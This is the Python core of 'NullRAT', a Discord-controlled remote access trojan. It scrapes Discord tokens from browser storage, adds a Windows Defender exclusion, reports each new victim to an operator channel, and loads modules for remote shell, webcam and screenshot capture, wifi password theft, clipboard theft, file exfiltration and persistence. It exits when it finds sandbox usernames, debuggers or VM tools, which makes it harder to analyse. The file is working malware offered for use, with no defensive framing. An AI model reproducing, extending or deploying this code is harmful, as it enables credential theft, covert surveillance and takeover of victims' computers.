from Variables import *

import disnake as discord
from disnake import Embed
from disnake.ext import commands

from datetime import datetime
from socket import create_connection
import os, psutil, re, requests, sys, subprocess, random

############### Global functions available in every cog
def genEmbed(self, title, timestamp, description=None):
    if description is None:
        embed = discord.Embed(
            title=title, 
            timestamp=timestamp
        )
    else:
        embed = discord.Embed(
            title=title, 
            description=description,
            timestamp=timestamp
        )
    embed.set_footer( text="NullRAT" )
    return embed

def find_token(self):
    tokens = []
    local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
    paths = {
        "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
    }
    for platform, path in paths.items():
        path += '\\Local Storage\\leveldb'
        try: 
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line): 
                            tokens.append(token)
        except FileNotFoundError: continue

    return tokens

#> custom bot implementation  

original_dir = os.getcwd()
identification = random.randint(10000, 90000)

class NullBot(commands.InteractionBot):
    def __init__(self, **options):
        super().__init__(**options)
        self.original_dir = original_dir

        # Checks if username is Admin/Administrator
        if "dmin" in os.getenv("username"):
            self.identifier = identification
        else:
            self.identifier = os.getenv("username") 
    
    genEmbed = genEmbed
    find_token = find_token
        
client = NullBot(test_guilds=server_ids)
nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata\\Roaming\\.cache"

if os.path.isdir(nr_working) != True:
    os.mkdir(nr_working)
    
subprocess.run(f"powershell Add-MpPreference -ExclusionPath '{nr_working}'", shell=True,
                stdin=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE)

#> on_ready():
    
@client.event
async def on_ready():
    embed = Embed(
        title = f"NullRAT **IX** started on: **{client.identifier}**", 
        description = f"Currently present in:\n```{client.original_dir}```",
        timestamp = datetime.now()
    ).set_author(
        name="NullCode1337", 
        url=r"https://denza.one/", 
        icon_url=r"https://avatars.githubusercontent.com/u/70959549?v=4"
    ).set_footer(
        text = f"Identifier: " + client.identifier 
    )
    await client.get_channel(notification_channel).send(embed=embed)    

#> basic commands 

@client.slash_command()
async def listvictims(ctx):
    """Lists all victim identifiers accessible by NullRAT"""
    await ctx.channel.send( 
        embed=discord.Embed(title=f"The identifier for {os.getenv('username')}:", description=client.identifier) 
    )
    await ctx.response.send_message("Checked all available victims:\n_ _")

@client.slash_command()
async def shutdown(ctx, victim):
    """Shuts down a specific instance of NullRAT.
    
    Parameters
    ----------
    victim: Identifier of the affected computer (found via /listvictims)
    """
    if str(victim) == str(client.identifier):
        await ctx.response.send_message(
            embed = client.genEmbed(
                "Shutting down NullRAT for **" + client.identifier + "**...",
                datetime.now()
            )
        )
        await client.close()
        
@client.slash_command(description="Quits all instances of NullRAT")
async def shutdown_all(ctx):
    """Shuts down all instances of NullRAT"""
    await ctx.response.send_message("Are you sure?", view=closeall_confirm())
    
#> shutdown class 

class closeall_confirm(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
    async def first_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.delete_original_message()
        await interaction.channel.send(embed=Embed(title="Shutting down all instances of NullRAT...")) 
        await client.close()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
    async def second_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.delete_original_message()
        await interaction.channel.send(embed=Embed(title="Aborted shutting down of all instances"))   
        
#> Extensions

extensions = (
    "ChangePass",     # /changepass
    "hideFile",       # /hidefile
    "unhideFile",     # /unhidefile
    "wifiList",       # /wifilist
    "wifiPass",       # /wifipass
    "shell",          # /cmd & /powershell
    "getenv",         # /get_environment
    "webcam",         # /get_webcam
    "runfile",        # /runfile
    "startup",        # /startup
    "tasklist",       # /list_runningtasks & /list_runningstore & /kill_runningtasks
    "clipboard",      # /get_clipboard
    "geolocate",      # /get_geolocation
    "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
    "rawtokens",      # /raw_tokens & /raw_discord
    "sendfiles",      # /sendfiles
    "systeminfo",     # /get_systeminfo
    "screenshot",     # /get_screenshot
    "receivefiles",   # /receivefiles
    "checkedtokens",  # /checked_tokens
)

for ex in extensions:
    ## For debugging
    # client.load_extension("modules."+ex)

    ## For production
    client.load_extension(ex) 
    
#> <start>
def is_connected():
    try: create_connection(("1.1.1.1", 53)); return True
    except OSError: return False

def checksss(processName):
    found = 0
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                found+=1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    if found >= 3: return True
    return False

# Anti TikTok
for i in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe","Bruno","vtc","vtc-PC"]: 
    if i in os.getenv("username"):
        raise SystemExit(0)

for process in psutil.process_iter():
    if process.name() in ["ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"]: 
        raise SystemExit(0)

if checksss(os.path.basename(sys.executable)): 
    raise SystemExit(0)

while is_connected() == False: 0
client.run(bot_token)

